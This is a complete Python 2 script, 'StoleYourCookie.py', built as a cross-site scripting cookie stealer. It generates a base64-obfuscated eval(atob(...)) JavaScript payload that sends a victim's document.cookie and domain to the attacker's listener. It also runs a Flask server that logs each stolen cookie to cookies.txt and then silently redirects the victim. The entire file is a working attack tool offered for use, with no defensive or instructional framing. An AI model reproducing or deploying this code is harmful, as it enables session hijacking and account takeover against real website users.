#!/usr/bin/env python2.7
import sys
from flask import Flask, redirect, request

app = Flask(__name__)
try:
    if sys.argv[1] == '-h':
        print "Usage: python2 StoleYourCookie.py <Local IP Address> <Port> <Redirection URL>"
        exit()
    stealer = str("document.location = 'http://%s:%s/?cookie=' + " % (sys.argv[1].strip(), sys.argv[2].strip()) + "document.domain+': '"  + "+document.cookie").encode('base64')
    payload = "".join(str("eval(atob('%s'))" % (stealer)).splitlines())
    print "-------------\nPayload: %s\n-------------" % (payload)
except:
    print "Usage: python2 StoleYourCookie.py <Local IP Address> <Port> <Redirection URL>"
    exit()
@app.route('/')
def index():
    try:
        if request.args.get('cookie') != None:
            with open("cookies.txt", "a+") as cookies:
                cookies.write(request.args.get('cookie').replace("%20"," ") + "\n")
                print "-------------\nStolen Cookie: " + request.args.get('cookie').replace("%20"," ") + "\n-------------\n"
    except Exception, e:
        print "Usage: python2 StoleYourCookie.py <Local IP Address> <Port> <Redirection URL>"
    return redirect(sys.argv[3], code=302)

if __name__ == '__main__':
    app.run(host=sys.argv[1], port=int(sys.argv[2]))
